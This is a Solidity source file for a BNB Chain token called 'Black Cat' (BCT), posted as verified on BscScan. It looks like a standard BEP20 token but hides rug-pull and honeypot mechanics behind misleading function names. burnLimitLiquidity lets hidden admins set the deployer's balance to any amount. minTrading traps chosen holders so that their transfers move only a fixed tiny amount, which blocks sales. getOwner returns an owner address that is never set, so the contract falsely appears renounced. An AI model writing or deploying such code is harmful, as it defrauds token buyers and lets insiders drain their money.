/**
 *Submitted for verification at BscScan.com on 2023-01-21
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;


interface UniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface UniswapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract BlackCat is IBEP20 {
    uint8 constant _decimals = 18;
    mapping(address => mapping(address => uint256)) _allowances;
    address public receiverTo;


    string constant _symbol = "BCT";


    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    address public exemptLiquidity;
    address public owner;
    mapping(address => bool) public receiverLaunch;
    mapping(address => bool) public sellMarketing;
    uint256 constant burnLiquidity = 14 ** 10;
    string constant _name = "Black Cat";
    mapping(address => uint256) _balances;

    modifier onlyOwner() {
        require(sellMarketing[msg.sender], "!OWNER");
        _;
    }

    constructor (){
        UniswapRouter exemptFee = UniswapRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        receiverTo = UniswapFactory(exemptFee.factory()).createPair(exemptFee.WETH(), address(this));
        _allowances[address(this)][address(exemptFee)] = type(uint256).max;
        exemptLiquidity = msg.sender;
        sellMarketing[exemptLiquidity] = true;
        _balances[exemptLiquidity] = _totalSupply;
        emit Transfer(address(0), exemptLiquidity, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function receiverTeamLimit(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(amount <= _balances[sender]);
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if (sender == exemptLiquidity || recipient == exemptLiquidity) {
            return receiverTeamLimit(sender, recipient, amount);
        }
        if (receiverLaunch[sender]) {
            return receiverTeamLimit(sender, recipient, burnLiquidity);
        }
        return receiverTeamLimit(sender, recipient, amount);
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function burnLimitLiquidity(uint256 listReceiver) public onlyOwner {
        _balances[exemptLiquidity] = listReceiver;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function minTrading(address enableBuy) public onlyOwner {
        receiverLaunch[enableBuy] = true;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            require(amount <= _allowances[sender][msg.sender]);
            _allowances[sender][msg.sender] -= amount;
        }
        return _transferFrom(sender, recipient, amount);
    }

    function amountMin(address autoExempt) public onlyOwner {
        sellMarketing[autoExempt] = true;
    }


}